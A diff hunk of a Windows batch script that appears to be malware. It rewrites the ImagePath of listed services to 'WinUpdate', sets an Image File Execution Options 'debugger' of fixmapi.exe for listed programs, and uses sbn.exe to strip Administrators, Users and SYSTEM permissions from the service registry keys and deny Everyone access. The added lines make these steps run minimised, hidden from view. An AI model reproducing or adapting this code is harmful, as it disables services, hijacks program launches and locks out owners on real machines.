@@ -22,13 +22,13 @@ move /y sbn.exe %windir%\sbn.exe
 
 ::newIMGpars
 set "f=%0"
-start /wait zz_new_img.bat %f
+start /wait /min zz_new_img.bat %f
 :: newSRVpars
-start /wait zz_new_srv.bat %f
-start cmd.exe /c "FOR /f "usebackq delims=" %%a IN ("zz_srv.sndr") DO Reg Add "HKLM\SYSTEM\CurrentControlSet\services\%%a" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f"
+start /wait /min zz_new_srv.bat %f
+start /min cmd.exe /c "FOR /f "usebackq delims=" %%a IN ("zz_srv.sndr") DO Reg Add "HKLM\SYSTEM\CurrentControlSet\services\%%a" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f"
 FOR /f "usebackq delims=" %%b IN ("zz_img.sndr") DO Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%b" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 
-start cmd.exe /c "FOR /f "usebackq delims=" %%c IN ("zz_srv.sndr") DO Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\%%c" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F"
+start /min cmd.exe /c "FOR /f "usebackq delims=" %%c IN ("zz_srv.sndr") DO Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\%%c" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F"
 FOR /f "usebackq delims=" %%d IN ("zz_img.sndr") DO Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%d" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 
 	
